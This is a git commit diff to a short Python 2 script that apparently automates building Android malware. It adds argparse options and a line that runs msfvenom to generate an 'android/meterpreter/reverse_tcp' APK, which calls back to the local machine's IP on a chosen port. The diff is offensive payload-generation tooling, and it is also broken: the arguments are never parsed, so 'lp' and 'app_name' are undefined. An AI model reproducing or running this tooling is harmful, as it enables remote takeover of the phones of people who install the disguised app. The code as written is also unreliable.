1a5cb9e25d1e20a6980831042d310e7a10abe3aa
Grester43hck <grester43hck@gmail.com>
2016-08-14 10:59:05 +0200

    try

--- Python-1.py
+++ Python-1.py
@@ -1,4 +1,6 @@
 import socket
+import argparse
+
 
 
 def get_ip_address():
@@ -6,11 +8,23 @@ def get_ip_address():
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
 
+def launchProcess(command):
+    p = Popen(command, stdout = PIPE, 
+        stderr = STDOUT, shell = True)
+    for line in p.stdout:
+        print line.replace('\n', '')
+
 from subprocess import Popen, PIPE, STDOUT
 
-ip = get_ip_address()
+parser = argparse.ArgumentParser(description='Testing')
+#parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
+                    #help='ip remota')
+parser.add_argument('app_name', metavar='name', type=str, nargs='+',
+                    help='nombre de la app')
+parser.add_argument('lp', metavar='lp', type=str, nargs='+',
+                    help='local port')
 
-p = Popen('echo hola', stdout = PIPE, 
-        stderr = STDOUT, shell = True)
-for line in p.stdout:
-    print line.replace('\n', '')
+ipl = get_ip_address()
+com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp+" R >"+app_name+".apk"
+
+launchProcess(com)
